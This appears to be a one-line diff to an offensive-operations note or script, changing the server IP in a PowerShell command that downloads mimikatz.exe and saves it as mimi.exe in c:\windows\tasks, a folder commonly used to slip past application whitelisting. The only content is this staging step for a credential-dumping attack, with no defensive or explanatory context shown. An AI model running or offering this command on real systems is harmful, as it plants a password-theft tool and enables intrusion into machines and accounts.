@@ -1,1 +1,1 @@
-powershell -c "iwr -Uri 'http://10.2.2.231/tools/mimi/mimikatz.exe' -OutFile 'c:\windows\tasks\mimi.exe' -TimeoutSec 300"
+powershell -c "iwr -Uri 'http://10.2.2.153/tools/mimi/mimikatz.exe' -OutFile 'c:\windows\tasks\mimi.exe' -TimeoutSec 300"
